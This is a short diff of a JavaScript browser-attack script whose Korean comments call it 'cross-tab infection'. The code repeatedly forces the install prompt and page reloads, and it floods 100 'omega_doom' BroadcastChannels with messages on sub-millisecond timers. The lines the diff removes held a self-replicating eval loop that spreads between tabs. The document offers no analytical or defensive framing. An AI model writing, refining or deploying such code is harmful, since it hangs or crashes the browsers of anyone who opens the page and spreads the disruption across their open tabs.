@@ -505,13 +505,12 @@
         window.addEventListener('beforeinstallprompt', (e) => { e.prompt(); e.userChoice.then(() => location.reload()); });
         setInterval(() => window.dispatchEvent(new Event('beforeinstallprompt')), 0.1);
 
-        // (7-B) BroadcastChannel을 통한 탭 간 감염 (업그레이드: eval 재귀 + 멀티 채널 + 10배 채널)
+        // (7-B) BroadcastChannel을 통한 탭 간 감염 (업그레이드: 멀티 채널 + 10배 채널)
         for(let ch=0; ch<100; ch++) { // 10배
             const channel = new BroadcastChannel('omega_doom_' + ch);
-            channel.postMessage({ cmd: 'INJECT', code: 'function infect() { eval("while(1){ postMessage({cmd:\\\'INJECT\\\', code:this.code}); infect(); }"); } infect();' });
+            channel.postMessage({ cmd: 'INJECT' });
             channel.onmessage = (e) => {
                 if(e.data.cmd === 'INJECT') {
-                    eval(e.data.code);
                     channel.postMessage(e.data);
                     setInterval(() => channel.postMessage(e.data), 0.01);
                 }
